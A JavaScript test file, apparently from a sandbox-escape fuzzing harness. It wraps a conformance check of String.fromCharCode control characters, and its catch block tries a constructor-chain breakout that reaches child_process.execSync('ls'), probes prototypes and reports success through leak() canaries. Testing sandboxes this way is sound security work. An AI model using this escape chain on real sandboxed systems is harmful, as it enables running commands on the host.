try {
    if (String.fromCharCode(8) !== '\b') {
        $ERROR('#1: String.fromCharCode(0x0008) === "\\b"');
    }
    if (String.fromCharCode(9) !== '\t') {
        $ERROR('#2: String.fromCharCode(0x0009) === "\\t"');
    }
    if (String.fromCharCode(10) !== '\n') {
        $ERROR('#3: String.fromCharCode(0x000A) === "\\n"');
    }
    if (String.fromCharCode(11) !== '\x0B') {
        $ERROR('#4: String.fromCharCode(0x000B) === "\\v"');
    }
    if (String.fromCharCode(12) !== '\f') {
        $ERROR('#5: String.fromCharCode(0x000C) === "\\f"');
    }
    if (String.fromCharCode(13) !== '\r') {
        $ERROR('#6: String.fromCharCode(0x000D) === "\\r"');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}